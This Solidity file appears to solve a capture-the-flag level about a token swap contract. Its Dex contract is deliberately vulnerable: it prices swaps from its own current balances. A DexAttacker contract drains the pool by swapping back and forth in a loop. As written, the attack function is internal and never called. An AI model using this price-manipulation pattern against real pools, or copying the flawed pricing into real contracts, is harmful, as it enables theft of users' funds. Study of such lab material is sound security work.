// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import "lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import 'lib/openzeppelin-contracts/contracts/access/Ownable.sol';

interface IDex {
  function token1() external view returns (address);
  function token2() external view returns (address);
  function swap(address from, address to, uint amount) external;
  function approve(address spender, uint amount) external;
}

contract Dex is Ownable {
  address public token1;
  address public token2;
  constructor() public {}

  function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
  }
  
  function addLiquidity(address token_address, uint amount) public onlyOwner {
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }
  
  function swap(address from, address to, uint amount) public {
    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapPrice(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  }

  function getSwapPrice(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableToken(token1).approve(msg.sender, spender, amount);
    SwappableToken(token2).approve(msg.sender, spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableToken is ERC20 {
  address private _dex;
  constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) public ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
  }

  function approve(address owner, address spender, uint256 amount) public returns(bool){
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
}

contract DexAttacker {

  IDex public dex;
  IERC20 public token1;
  IERC20 public token2;
  
  constructor(address dexAddr) {
    dex = IDex(dexAddr);
    token1 = IERC20(dex.token1());
    token2 = IERC20(dex.token2());
  }

  function fire() internal {
      require(token1.balanceOf(address(this)) == 10, "I need some tokens!!!");
      require(token2.balanceOf(address(this)) == 10, "I need some tokens!!!");
      token1.transfer(address(dex), 10);
      for (uint i = 0; i < 11; i++) {
        if (i % 2 == 0) {
            uint orig = token2.balanceOf(address(this));
            token2.approve(address(dex), orig);
            dex.swap(address(token2), address(token1), orig);
        }
        else {
            uint orig = token1.balanceOf(address(this));
            token1.approve(address(dex), orig);
            dex.swap(address(token1), address(token2), orig);
        }            
      }
      token1.approve(address(dex), 76);
      dex.swap(address(token1), address(token2), 34);
    }
}